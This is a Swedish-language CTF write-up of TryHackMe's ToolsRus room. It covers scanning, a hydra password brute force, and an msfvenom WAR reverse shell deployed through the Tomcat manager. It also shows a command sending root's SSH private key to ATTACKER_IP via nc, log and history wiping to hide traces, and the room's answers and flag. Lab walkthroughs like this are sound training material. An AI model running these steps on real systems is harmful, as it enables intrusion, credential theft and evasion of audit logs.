---
title: "ToolsRus Writeup"
date: 2023-07-12
tags: [writeup, ctf, tryhackme]
description: "Ladda upp en skadlig WAR-fil till en sårbar Tomcat-manager för ett reverse shell i TryHackMes ToolsRus-rum, och sedan säkra persistens med en SSH-nyckel."
---

## Setup 

Vi behöver först ansluta till tryhackmes VPN-server. Du kan få mer information om detta genom att besöka sidan [Access](https://tryhackme.com/access).

Jag kommer använda `openvpn` för att ansluta till servern. Här är kommandot:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Rekognosering
Dags för lite snabba portskanningar och rek (gud välsigne skaparna av `rustscan`):
```shell-session
$ rustscan -b 4500 -a TARGET_IP -r 1-65535 --ulimit 5000 -t 2000 -- -oN rustscan_port_scan.txt 
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
1234/tcp open  hotline syn-ack
8009/tcp open  ajp13   syn-ack


$ rustscan -b 4500 -a TARGET_IP -p 22,80,1234,8009 --ulimit 5000 -t 2000 -- -sV -oN rustscan_service_scan.txt
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
1234/tcp open  http    syn-ack Apache Tomcat/Coyote JSP engine 1.1
8009/tcp open  ajp13   syn-ack Apache Jserv (Protocol v1.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Lite katalog-enumerering:
```shell-session
$ gobuster dir -t 64 -u http://TARGET_IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster_common.txt 
$ cat gobuster_common.txt       
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 292]
/guidelines           (Status: 301) [Size: 319] [--> http://TARGET_IP/guidelines/]
/index.html           (Status: 200) [Size: 168]
/protected            (Status: 401) [Size: 460]
/server-status        (Status: 403) [Size: 301]
```

 > What directory can you find, that begins with a "g"?
 > 
 > Answer: `guidelines`
 
Om vi besöker katalogen `/guidelines/` ser vi bara en text som säger: `Hey bob, did you update that TomCat server?`. 

> Whose name can you find from this directory?
> 
> Answer: `bob`


Dessutom ger en förfrågan till katalogen `protected` oss en autentiserings-popup...
> What directory has basic authentication?
> 
> Answer: `protected`

Låt oss försöka köra brute force mot det med hydra :)
```shell-session
$ hydra -l bob -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt -s 80 -f TARGET_IP http-get /protected
...
...
[80][http-get] host: TARGET_IP   login: bob   password: bubbles
```

> What is bob's password to the protected part of the website?
> 
> Answer: `bubbles`

När vi loggar in på sidan `protected` möts vi av följande sida:
![](/assets/img/writeup_assets/toolsrus/protected_page_moved.png)

Som vi såg från portskanningarna tidigare körs en _Apache Tomcat server_ på port **1234**. Låt oss försöka logga in på portalen där genom att göra en request till: `http://TARGET_IP:1234/manager/`. Detta visar oss en välbekant autentiseringstjänst. Om vi använder inloggningsuppgifterna: `bob:bubbles`, får vi åtkomst till serverpanelen!

> What other port that serves a webs service is open on the machine?
> 
> Answer: `1234`



Versionsnumret för Tomcat-servern finns längst ner på `manager`-sidan...
> Going to the service running on that port, what is the name and version of the software?
> (Answer format: Full_name_of_service/Version)
> 
> Answer: `Apache Tomcat/7.0.88`

Det finns totalt 5 dokumentationsfiler som nämns på Tomcat-managersidan, så inget behov av att använda `nikto` än (dessutom är det lite förvirrande att använda ngl):
> How many documentation files did ~~Nikto~~ you identify?
> 
> Answer: `5`


> What is the server version (run the scan against port 80)?
> 
> Answer: `Apache/2.4.18`


> What version of Apache-Coyote is this service using?
> 
> Answer: `1.1`


Beväpnade med all denna info om versionsnummer och grejer, låt oss se vilka exploits vi kan dra nytta av för att få åtkomst till målmaskinen:

## Skaffa åtkomst
Nu... Om vi gör som rummet instruerar brukar denna sektion bestå av _2_ delar, men eftersom vi kan driftsätta en fil på `manager`-sidan kan vi enkelt få ett reverse shell (vilket du längre fram kommer se är ett root-shell!). Låt oss börja med att generera en passande payload:
```shell-session
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war > reverse.war
```

Vi genererar en `WAR`-fil som payload eftersom det är vad vi kan ladda upp från `manager`-sidan: 
![](/assets/img/writeup_assets/toolsrus/war_file_upload.png)

När filen är deployad, starta en lyssnare på den angivna porten på din maskin (4444 i det här fallet), så här:
```shell-session
$ nc -nvlp 4444
```

När vi nu gör en request till URL:en `http://TARGET_IP:1234/reverse/`, får vi en anslutning på vår netcat-lyssnare, och vi kan gå vidare till att stabilisera shellet:
```shell-session
$ nc -nvlp 4444          
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 44662

python -c "import pty; pty.spawn('/bin/bash')"
root@ip-TARGET_IP:/# ^Z
zsh: suspended  nc -nvlp 4444

$ stty raw -echo && fg
[1]  + continued  nc -nvlp 4444

export TERM=xterm-256-color
root@ip-TARGET_IP:/# whoami
root

root@ip-TARGET_IP:/# ls /root
flag.txt  snap

root@ip-TARGET_IP:/# cat /root/flag.txt 
`ff1fc4a81affcc7688cf89ae7dc6e0e1`
```

***!!BONUSSTEG!!***

Även om vi har ett rootat reverse shell är det fortfarande bökigt att behöva ladda upp ett reverse shell och stabilisera det om och om igen om vi planerar att exploita den här maskinen senare, så låt oss hämta den privata ssh-nyckeln för persistens, samt städa upp filen `/reverse.war` som vi laddade upp:
```shell-session

## On our machine:
$ nc -nvlp 8888 > toysrus_id_rsa

## On target machine;
root@ip-TARGET_IP:/# ssh-keygen
## Empty passphrases...
root@ip-TARGET_IP:/# nc ATTACKER_IP 8888 -w 3 < /root/.ssh/id_rsa
```

Snyggt! Nu har vi persistent åtkomst via `ssh`, låt oss städa upp lite grejer innan vi är klara...
```shell-session
root@ip-TARGET_IP:/# echo "" > /root/.bash_history 
root@ip-TARGET_IP:/# rm /usr/local/tomcat7/webapps/reverse.war 
root@ip-TARGET_IP:/# rm -rf /usr/local/tomcat7/webapps/reverse/
root@ip-TARGET_IP:/# rm -rf /usr/local/tomcat7/work/Catalina/localhost/reverse
root@ip-TARGET_IP:/# echo "" > /var/log/apache2/access.log 
root@ip-TARGET_IP:/# echo "" > /var/log/apache2/error.log 
root@ip-TARGET_IP:/# echo "" > /var/log/apache2/other_vhosts_access.log 

## Just for good measure...
root@ip-TARGET_IP:/# echo "" > /root/.bash_history
```

Och vi är klara!

> What text is in the file `/root/flag.txt`?
> 
> Answer:  `ff1fc4a81affcc7688cf89ae7dc6e0e1`

## Slutsats
Om denna writeup hjälpte dig, överväg gärna att följa mig på github (https://github.com/NovusEdge) och/eller lämna en stjärna på repot: https://github.com/NovusEdge/thm-writeups


- Rum: [ToolsRus](https://tryhackme.com/room/toolsrus)
